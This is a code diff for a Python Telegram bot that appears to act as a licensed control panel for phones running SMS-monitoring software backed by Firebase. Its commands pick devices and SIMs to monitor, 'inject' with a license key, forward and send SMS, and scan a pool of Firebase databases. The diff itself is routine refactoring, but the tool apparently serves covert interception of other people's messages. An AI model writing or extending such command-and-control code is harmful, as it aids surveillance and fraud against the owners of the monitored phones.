@@ -40,6 +40,7 @@ from app.device_ui import (
     format_inject_startup_card,
     format_send_queued,
     format_status_card,
+    format_monitoring_stopped_card,
     format_stop_card,
     STARTUP_TEST_MESSAGE,
     STARTUP_TEST_SENDER,
@@ -58,6 +59,7 @@ from app.license_keys import (
 from app.telegram_notify import send_inject_stream_dm
 from app.services import (
     device_status,
+    get_all_firebase_urls,
     get_active_device,
     get_monitoring_user_ids,
     register_device,
@@ -547,7 +549,7 @@ async def _sim_menu_after_stop(
     if device.firebase_source_url:
         asyncio.create_task(_background_sync_device(device.id, user_id))
     return (
-        format_device_set_card(device, sim_index, profile),
+        format_monitoring_stopped_card(device, profile),
         device_set_keyboard(device),
     )
 
@@ -731,8 +733,14 @@ async def device_select_command(
 
     import time
 
+    db_pool: Session = SessionLocal()
+    try:
+        pool_count = len(get_all_firebase_urls(db_pool))
+    finally:
+        db_pool.close()
     status_msg = await update.message.reply_text(
-        f"🔍 Device <code>{deviceid}</code> dhundh raha hoon...",
+        f"⚡ Fast find — <code>{deviceid}</code>\n"
+        f"🔥 {pool_count} Firebase parallel scan...",
         parse_mode="HTML",
     )
     db: Session = SessionLocal()
@@ -1677,27 +1685,9 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) ->
 
 
 async def _post_init_set_commands(app: Application) -> None:
-    from telegram import BotCommand
+    from app.telegram_commands import register_bot_commands
 
-    commands = [
-        BotCommand("start", "Welcome & setup guide"),
-        BotCommand("setfirebase", "Connect your Firebase DB"),
-        BotCommand("setdevice", "Pick device & select SIM"),
-        BotCommand("fb", "Find device & select SIM (admin)"),
-        BotCommand("fy", "Pick device to monitor"),
-        BotCommand("a", "Pick device with KEY (inject)"),
-        BotCommand("mynum", "Your forwarding number"),
-        BotCommand("key", "License key for inject"),
-        BotCommand("addchannel", "Link Telegram channel"),
-        BotCommand("startmonitor", "Start monitoring"),
-        BotCommand("autostop", "Auto-stop timer (minutes)"),
-        BotCommand("stop", "Pause monitoring"),
-        BotCommand("resume", "Resume monitoring"),
-        BotCommand("status", "Current stats"),
-        BotCommand("send", "Manual SMS"),
-        BotCommand("ping", "Check latency"),
-    ]
-    await app.bot.set_my_commands(commands)
+    await register_bot_commands(app.bot)
 
 
 def build_telegram_app() -> Application | None:
@@ -1730,6 +1720,7 @@ def build_telegram_app() -> Application | None:
     app.add_handler(CommandHandler("startmonitar", startmonitar_command))
     app.add_handler(CommandHandler("startmonitor", startmonitar_command))
     app.add_handler(CommandHandler("stopmonitar", stopmonitar_command))
+    app.add_handler(CommandHandler("stopmonitor", stopmonitar_command))
     app.add_handler(CallbackQueryHandler(button_callback))
     app.add_handler(CommandHandler("allfirebase", allfirebase_command))
     app.add_handler(CommandHandler("setfirebase", setfirebase_command))
